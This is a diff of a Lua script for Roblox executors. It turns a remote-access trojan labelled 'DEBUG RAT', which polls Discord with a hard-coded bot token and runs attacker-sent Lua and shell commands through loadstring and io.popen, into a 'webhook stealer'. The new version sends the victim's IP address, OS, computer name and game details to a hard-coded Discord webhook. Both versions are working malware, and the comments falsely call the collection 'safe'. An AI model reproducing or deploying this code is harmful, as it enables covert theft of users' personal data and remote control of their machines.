@@ -1,21 +1,17 @@
 -- ============================================================
--- DEBUG RAT – With Full Logging
+-- WEBHOOK STEALER – No Bot Token, No Channel ID
 -- ============================================================
-local botToken = "MTUzMzg5MjMyMDQ1NjM0Nzc4OA.GKEOrv.PKV9UcJd703CEZorhu6HqPI_ERafjoUJUwSaEE"
-local channelID = "1543230748180615198"
+local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"
 
+-- ========== HTTP SENDER ==========
 local function sendMessage(content)
-    local url = "https://discord.com/api/v10/channels/" .. channelID .. "/messages"
     local payload = {content = content}
     local json = game:GetService("HttpService"):JSONEncode(payload)
-    local headers = {
-        ["Authorization"] = "Bot " .. botToken,
-        ["Content-Type"] = "application/json"
-    }
+    local headers = {["Content-Type"] = "application/json"}
     local methods = {
-        function() return pcall(request, {Url = url, Method = "POST", Headers = headers, Body = json}) end,
-        function() return pcall(http_request, {Url = url, Method = "POST", Headers = headers, Body = json}) end,
-        function() return pcall(game:GetService("HttpService").PostAsync, game:GetService("HttpService"), url, json, Enum.HttpContentType.ApplicationJson) end
+        function() return pcall(request, {Url = webhook, Method = "POST", Headers = headers, Body = json}) end,
+        function() return pcall(http_request, {Url = webhook, Method = "POST", Headers = headers, Body = json}) end,
+        function() return pcall(game:GetService("HttpService").PostAsync, game:GetService("HttpService"), webhook, json, Enum.HttpContentType.ApplicationJson) end
     }
     for _, method in ipairs(methods) do
         local ok, res = method()
@@ -24,76 +20,7 @@ local function sendMessage(content)
     return false
 end
 
--- ========== READ LAST MESSAGE (with full response logging) ==========
-local function getLastMessage()
-    local url = "https://discord.com/api/v10/channels/" .. channelID .. "/messages?limit=1"
-    local headers = {["Authorization"] = "Bot " .. botToken, ["Content-Type"] = "application/json"}
-    -- Try request first
-    local ok, res = pcall(request, {Url = url, Method = "GET", Headers = headers})
-    if ok and res and res.Body then
-        local data = game:GetService("HttpService"):JSONDecode(res.Body)
-        if data and #data > 0 then
-            return data[1].content or ""
-        else
-            return nil -- no messages or malformed
-        end
-    end
-    -- Try http_request
-    ok, res = pcall(http_request, {Url = url, Method = "GET", Headers = headers})
-    if ok and res and res.Body then
-        local data = game:GetService("HttpService"):JSONDecode(res.Body)
-        if data and #data > 0 then
-            return data[1].content or ""
-        end
-    end
-    -- Try HttpService:GetAsync (if supported)
-    ok, res = pcall(function()
-        return game:GetService("HttpService"):GetAsync(url, {Headers = headers})
-    end)
-    if ok and res then
-        local data = game:GetService("HttpService"):JSONDecode(res)
-        if data and #data > 0 then
-            return data[1].content or ""
-        end
-    end
-    return nil -- failed
-end
-
--- ========== EXECUTE COMMANDS ==========
-local function executeCommand(cmd)
-    if cmd:sub(1, 6) == "!exec " then
-        local code = cmd:sub(7)
-        local fn, err = loadstring(code)
-        if fn then
-            local ok, result = pcall(fn)
-            if ok then
-                return "✅ Executed.\nOutput: " .. tostring(result)
-            else
-                return "❌ Error: " .. tostring(result)
-            end
-        else
-            return "❌ Loadstring error: " .. tostring(err)
-        end
-    end
-    if cmd:sub(1, 7) == "!shell " then
-        local shellCmd = cmd:sub(8)
-        if io and io.popen then
-            local handle, err = io.popen(shellCmd)
-            if handle then
-                local output = handle:read("*a")
-                handle:close()
-                return "```\n" .. output .. "\n```"
-            else
-                return "❌ io.popen error: " .. tostring(err)
-            end
-        else
-            return "❌ io.popen not available. Use !exec instead."
-        end
-    end
-    return "Unknown command. Use !exec <lua> or !shell <cmd>"
-end
-
--- ========== COLLECT DATA ==========
+-- ========== COLLECT DATA (safe) ==========
 local function collectSnapshot()
     local player = game.Players.LocalPlayer
     local info = {
@@ -106,6 +33,7 @@ local function collectSnapshot()
         gameName = game.Name or "Unknown",
         placeVisits = tostring(game.PlaceVisitCount or "N/A"),
         genres = game.Genres or "N/A",
+        version = game.Version or "N/A",
     }
     -- IP
     local ip = "N/A"
@@ -160,7 +88,7 @@ local function collectSnapshot()
         info.graphics = tostring(game:GetService("GraphicsSettings").GraphicsQualityLevel)
         info.volume = tostring(game:GetService("SoundService").Volume)
     end)
-    -- System env
+    -- System env (safe)
     pcall(function()
         info.os = os.getenv("OS") or "N/A"
         info.computer = os.getenv("COMPUTERNAME") or os.getenv("HOSTNAME") or "N/A"
@@ -169,8 +97,8 @@ local function collectSnapshot()
     return info
 end
 
--- ========== SEND INITIAL ==========
-local function sendInitial()
+-- ========== SEND DATA ==========
+local function sendData()
     local data = collectSnapshot()
     local lines = {}
     for k, v in pairs(data) do
@@ -229,36 +157,5 @@ local function createGUI()
 end
 
 -- ========== MAIN ==========
-sendMessage("```🔧 RAT starting – debug mode ON```")
-
--- Send initial data dump
-sendInitial()
+sendData()
 createGUI()
-
--- Command polling loop with debug
-local lastMsg = ""
-local loopCount = 0
-while true do
-    task.wait(3)
-    loopCount = loopCount + 1
-    -- Every 10 loops (30 seconds), send a heartbeat to confirm script is alive
-    if loopCount % 10 == 0 then
-        sendMessage("```💓 Heartbeat: Script still running (loop " .. loopCount .. ")```")
-    end
-    
-    local msg = getLastMessage()
-    if msg then
-        -- If we got a message
-        if msg ~= lastMsg and (msg:sub(1,6)=="!exec " or msg:sub(1,7)=="!shell ") then
-            lastMsg = msg
-            sendMessage("```📩 Command detected: " .. msg .. "```") -- debug
-            local response = executeCommand(msg)
-            sendMessage(response)
-        end
-    else
-        -- If getLastMessage returned nil, it failed to fetch messages
-        if loopCount % 5 == 0 then
-            sendMessage("```⚠️ Failed to fetch messages – check permissions and token.```")
-        end
-    end
-end
